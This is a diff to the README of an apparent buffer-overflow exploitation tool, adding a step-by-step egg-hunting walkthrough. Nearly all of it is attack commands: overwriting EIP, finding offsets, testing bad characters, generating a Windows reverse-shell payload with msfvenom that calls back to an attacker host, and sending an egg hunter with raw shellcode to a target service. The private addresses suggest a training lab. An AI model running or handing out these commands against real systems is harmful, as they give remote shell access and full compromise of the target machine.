@@ -106,7 +106,7 @@ write - Sends malicious shell code (hex string file) via buffer overflow
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4
 ```
 
-5. Badchar testing
+5. Bad char testing
 ```
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=5048 --buffsize=4096 --buffhead='chk2 /.:/' --offset=3391 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=badchar --nopsb=4 --exclude=00 -v
 ```
@@ -120,4 +120,36 @@ msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=1313 -f he
 
 ## Egg Hunting example
 
-TODO
+1. Overwrite EIP
+```
+./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2048 --buffsize=1000 --buffhead='cmd1 /.:/'
+```
+
+2. Identify EIP offset
+```
+./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2048 --buffsize=1000 --buffhead='cmd1 /.:/'
+```
+
+3. Identify command to write to memory
+```
+./ig-buffer-overflow.py -m test --rhost=10.2.31.146 --rport=2050 --buffsize=1000 --buffhead='cmd2 OVNI'
+```
+
+4. Bad char testing
+```
+./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=2000 --buffhead='cmd2 OVNI' --offset=1 --hexcontent=90 --after=badchar --exclude=00 --nopsa=2 -v
+```
+
+5. Write exploit with egg
+```
+msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=1313 -f hex EXITFUNC=thread -o reverse
+
+./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=2000 --buffhead='cmd2 OVNIOVNI' --offset=1 --hexcontent=90 --after=shellcode --shellcode=reverse --nopsa=20 -v
+```
+
+6. Generate egg hunter and send
+```
+msf-egghunter -f hex -e OVNI -v egg
+
+./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=144 --buffhead='cmd1 /.:/' --offset=48 --hexcontent=l6250130A --after=6681caff0f42526a0258cd2e3c055a74efb84f564e4989d7af75eaaf75e7ffe7 --nopsa=2 -v
+```
